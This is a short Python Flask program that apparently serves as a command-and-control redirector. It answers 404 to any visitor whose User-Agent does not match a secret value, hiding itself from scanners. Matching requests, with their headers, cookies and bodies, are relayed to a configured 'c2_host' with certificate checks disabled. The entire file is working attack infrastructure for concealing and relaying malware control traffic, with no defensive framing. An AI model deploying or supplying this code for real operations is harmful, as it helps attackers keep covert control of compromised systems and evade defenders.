import requests
from flask import Flask, request,abort
from user_agents import parse
from urllib.parse import urlencode
import os

app = Flask(__name__)

@app.before_request
def block_user_agents():
    user_agent = request.headers.get('User-Agent')
    agent = os.getenv("agent")
    if agent != "None" and agent != user_agent:
        abort(404)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def reverse_proxy(path):
    host = os.getenv("c2_host")
    if host == "None":
        abort(404)
    target_url = os.getenv("c2_host") + path
    query_params = urlencode(request.args)
    if query_params:
        target_url += '?' + query_params
    headers = {key: value for (key, value) in request.headers if key != 'Host'}
    response = requests.request(
        method=request.method,
        url=target_url,
        headers=headers,
        data=request.get_data(),
        cookies=request.cookies,
        allow_redirects=False,
        verify=False
    )
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for (name, value) in response.raw.headers.items()
               if name.lower() not in excluded_headers]
    return response.content, response.status_code, headers
